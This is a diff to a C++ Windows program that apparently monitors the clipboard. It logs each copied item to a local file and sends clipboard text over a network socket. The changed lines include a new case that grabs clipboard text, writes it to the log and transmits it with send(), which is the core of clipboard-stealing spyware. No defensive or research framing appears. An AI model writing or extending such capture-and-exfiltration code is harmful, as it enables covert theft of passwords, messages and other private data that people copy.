@@ -25,7 +25,7 @@ string Logbook = "Log1.txt";
 ofstream Recorder(Logbook);
 
 // used for socket object
-map<int, string>Format_names = { {1,"CF_TEXT"},{2,"CF_BITMAP"},{3,"CF_METAFILEPICT"},{4,"CF_STLK"},{5,"CF_DIF"},{6,"CF_TIFF"},{7,"CF_OEMTEXT"},{8,"CF_DIB"},{9,"CF_PALETTE"}, {10,"CF_PENDATA"}, {11,"CF_RIFF"},{12,"CF_WAVE"},{13,"UNICODETEXT"}, {14,"CF_ENHMETAFILE"}, {15,"CF_HDROP"},{16,"CF_LOCALE"},{17,"CF_DIBV5"} };
+map<int, string>Format_names = { {0,"FAIL call from CountClipboardFormats function"}, {1,"CF_TEXT"},{2,"CF_BITMAP"},{3,"CF_METAFILEPICT"},{4,"CF_STLK"},{5,"CF_DIF"},{6,"CF_TIFF"},{7,"CF_OEMTEXT"},{8,"CF_DIB"},{9,"CF_PALETTE"}, {10,"CF_PENDATA"}, {11,"CF_RIFF"},{12,"CF_WAVE"},{13,"UNICODETEXT"}, {14,"CF_ENHMETAFILE"}, {15,"CF_HDROP"},{16,"CF_LOCALE"},{17,"CF_DIBV5"} };
 
 
 int main() {
@@ -126,17 +126,15 @@ int main() {
 			const int max_count = 4096;
 			wchar_t format_name[max_count];
 			int format = (int)formats;
-			//flags to check the clipboard format.
-			bool UNICODETEXT = IsClipboardFormatAvailable(CF_UNICODETEXT);
-			bool Text = IsClipboardFormatAvailable(CF_TEXT);
-			bool TIFF = IsClipboardFormatAvailable(CF_TIFF);
+	
 
 			HANDLE in;
 			if (!same) {
 				std::cout << "==========================================================================================================================" << endl;
-				std::cout << "Format " << Format_names.at(format) << " " << "Sequence :" << ClipSeq << endl;
+				std::cout << "Format "<<format<<": " << Format_names.at(format) << " " << "Sequence :" << ClipSeq << endl;
 				Recorder << "==========================================================================================================================" << endl;
-				Recorder << "Format " << Format_names.at(format) << " " << "Sequence :" << ClipSeq << endl;
+				Recorder << "Format " <<format<<": "<< Format_names.at(format) << " " << "Sequence :" << ClipSeq << endl;
+
 
 				switch (format) {
 					//Data type: ANSI text
@@ -171,10 +169,22 @@ int main() {
 					//Cf_Sylk
 				case 4:
 					break;
+					
 					//Data type:ASCII Text
 					//Use Case:Software Arts Data Interchange Format
 					//CF_Dif
 				case 5:
+					OpenClipboard(0);
+					//grab text from the clipboard
+					in = GetClipboardData(CF_TEXT);
+					//using said text display it to the console and store into the Logbook
+					std::cout << (char*)in << endl;
+					Recorder << (char*)in << endl;
+					if (GoodSocket) {
+						sendbuf = (char*)in;
+						iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
+					}
+					CloseClipboard();
 					break;
 					//Data type:TIFF
 					//Use Case:TIFF image
@@ -319,7 +329,7 @@ int main() {
 		}
 
 		catch (exception e) {
-			cout << "this is not text" << endl;
+			cout << "An exception was thrown: "<<e.what() << endl;
 
 		}
 	}
